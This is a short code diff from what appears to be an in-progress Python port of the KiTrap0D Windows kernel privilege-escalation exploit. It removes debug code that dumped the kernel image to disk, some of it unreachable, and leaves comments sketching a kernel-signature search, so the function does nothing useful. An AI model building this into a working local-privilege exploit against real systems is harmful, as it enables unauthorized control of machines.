@@ -394,19 +394,12 @@ def kitrap0d():
     optional_header = nt_header.contents.OptionalHeader
     baseofcode = optional_header.BaseOfCode
     sizeofcode = optional_header.SizeOfCode
-    #search between kernelhandle[baseofcode] - kernelhandle[baseofcode+sizeofcode] for xpsig
     buf = ctypes.c_byte*kernsize
     kernelarray = ctypes.cast(kernhandle, ctypes.POINTER(buf)).contents
-    fh=open("E:\\file.exe",'wb')
-    kernelarray = kernelarray[:]
-    kernelarray = [chr(abs(i)) for i in kernelarray]
-    return kernelarray
-    fh.close()
-    #for i in range(0,kernsize):
-    #    chunk = ''.join([chr(abs(i)) for i in kernelarray[i:i+len(xpsig)]])
-    #    if chunk == xpsig:
-    #        continue
-    return i
+    #i = OptHeader->BaseOfCode; i < OptHeader->SizeOfCode; i++
+    #&ImageBase[i] = kernel handle
+    #kernoff = i at start of xpsig
+    return
     
     
 
